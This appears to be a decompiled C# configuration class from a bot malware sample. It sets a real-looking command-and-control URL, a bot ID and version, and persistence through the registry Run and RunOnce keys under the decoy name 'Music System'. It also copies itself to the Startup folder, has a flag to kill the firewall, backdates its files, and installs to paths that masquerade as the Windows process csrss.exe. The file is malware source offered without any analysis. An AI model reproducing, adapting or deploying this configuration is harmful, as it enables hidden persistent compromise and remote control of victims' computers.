using System.Collections;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using a.My;

namespace a;

[StandardModule]
internal sealed class Config
{
	public static string Server = "https://mail.carterprinciples.in/12/stat.php";

	public static bool Debug = false;

	public static string SleepInitival = Conversions.ToString(900000);

	public static string BotVer = "21";

	public static string BotId = "debug-boat";

	public static string MainLoopInitival = Conversions.ToString(900000);

	public static bool TryCopToStartFolder = true;

	public static string StartupFolderExeName = "Music System.exe";

	public static bool CopyOldFileDates = true;

	public static bool KillFW = true;

	public static string smtpserver = "";

	public static bool silent = false;

	public static string RegStartup = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	public static string RegName = "Music System";

	public static string ExtraRegStartup = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";

	public static string ExtraRegName = "Music System";

	public static string IDRegStartup = "Music.OD";

	public static string UpdateFile = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles() + "\\Internet Explorer\\csrss_.exe";

	public static string FilePath = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles() + "\\Internet Explorer\\csrss.exe";

	public static string FolderPath = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles() + "\\Internet Explorer\\";

	public static string ALTUpdateFile1 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles()
		.Substring(0, 1) + ":\\WINDOWS\\Tasks\\csrss_.exe";

	public static string ALTFilePath1 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles()
		.Substring(0, 1) + ":\\WINDOWS\\Tasks\\csrss.exe";

	public static string ALTFolderPath1 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles()
		.Substring(0, 1) + ":\\WINDOWS\\Tasks\\";

	public static string ALTUpdateFile2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles()
		.Substring(0, 1) + ":\\Users\\Public\\Favorites\\csrss_.exe";

	public static string ALTFilePath2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles()
		.Substring(0, 1) + ":\\Users\\Public\\Favorites\\csrss.exe";

	public static string ALTFolderPath2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles()
		.Substring(0, 1) + ":\\Users\\Public\\Favorites\\";

	public static ListBox ProsNotAllowed = new ListBox();

	public static ArrayList notagainlist = new ArrayList();

	public static ArrayList links = new ArrayList();
}
